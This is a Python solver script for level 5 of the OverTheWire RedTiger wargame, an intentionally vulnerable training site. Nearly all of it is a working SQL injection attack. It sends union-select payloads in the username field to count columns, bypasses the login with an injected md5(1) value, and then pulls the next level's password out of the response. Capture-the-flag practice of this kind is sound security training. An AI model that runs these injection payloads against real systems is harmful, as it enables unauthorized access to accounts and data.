#!/usr/bin/env python3
import pickle
import tigers as tg


def main():

    url = "https://redtiger.labs.overthewire.org/level5.php"
    finds = 'md5(1)' 
    url_param = '?mode=login'
    pass_r = 'The password for the next level is: '

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level5login' not in cooks:
            print('use prevision level')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    cook = dict(level5login=cooks['level5login'])

    # Counting the number of columns
    columns = 1
    response = 'User not found'
    while 'User not found' in response:
        list_of_columns = [str(c + 1) for c in range(columns)]
        data = dict(
            username=f"' union select {','.join(list_of_columns)} #", password=1, login='Login')
        response = tg.get_request(
            url + url_param, data, cook, method='post')
        columns += 1

    print(list_of_columns)

    # Try to auth
    data = dict(
        username="' union select %s #", password=1, login='Login')

    response = tg.try_auth(url, list_of_columns, data,
                url_param, finds, cook)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    # Save cookie
    if ('level6login' not in cooks) or (cooks['level6login'] != passw):
        cooks['level6login'] = passw
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()





